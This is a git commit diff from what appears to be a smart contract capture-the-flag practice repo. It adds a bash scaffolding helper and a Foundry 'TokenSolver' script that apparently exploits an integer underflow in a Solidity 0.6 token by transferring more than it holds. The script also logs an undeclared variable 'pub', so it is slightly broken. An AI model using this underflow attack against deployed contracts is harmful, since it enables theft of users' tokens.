0b77c5e330ee6d9bb300813f54f8f2c4ee4c9f01
Issa Oulkhir <ioulkhir@e2r7p5.1337.ma>
2026-01-27 11:33:18 +0100

    good scripting

--- newChal.bash
+++ newChal.bash
@@ -1,5 +1,21 @@
 touch ./src/$1.sol
 touch ./script/$1.s.sol
+cp ./script/Token.s.sol ./script/$1.s.sol
+export payload='s/Token/'
+export payload+=$1
+export payload+='/g'
+sed -i -e $payload ./script/$1.s.sol
+export payload='s/0x5b84Aee912D7B4247787230E9057f07feAc1143F/'
+export payload+=$2
+export payload+='/g'
+sed -i -e $payload ./script/$1.s.sol
 ls src | grep $1
 ls script | grep $1
 
+head -n 2 ./src/$1.sol > tmp1
+tail -n +3 ./script/$1.s.sol > tmp2
+
+cat tmp1 > ./script/$1.s.sol
+cat tmp2 >> ./script/$1.s.sol
+
+rm tmp1 tmp2
--- script/Token.s.sol
+++ script/Token.s.sol
@@ -4,24 +4,22 @@ pragma solidity ^0.6.0;
 import {Script, console} from "forge-std/Script.sol";
 import { Token } from "../src/Token.sol";
 
-contract TelephoneSolver is Script {
+contract TokenSolver is Script {
 
-    Token public instance = Token(0x5b84Aee912D7B4247787230E9057f07feAc1143F);
+	Token public instance = Token(0x5b84Aee912D7B4247787230E9057f07feAc1143F);
 
 	uint256 prv = vm.envUint("PRV");
 	address me = vm.envAddress("PUB");
 
-    function run() external {
-        vm.startBroadcast(prv);
-        
-        console.log("before attack --> ", instance.balanceOf(pub));
+	function run() external {
+		vm.startBroadcast(prv);
 
-        instance.transfer(address(0), 21);
+		console.log("before attack --> ", instance.balanceOf(pub));
+		instance.transfer(address(0), 21);
+		console.log("aftA attack --> ", instance.balanceOf(pub));
 
-        console.log("aftA attack --> ", instance.balanceOf(pub));
-
-        vm.stopBroadcast();
-    }
+		vm.stopBroadcast();
+	}
 
 }
 
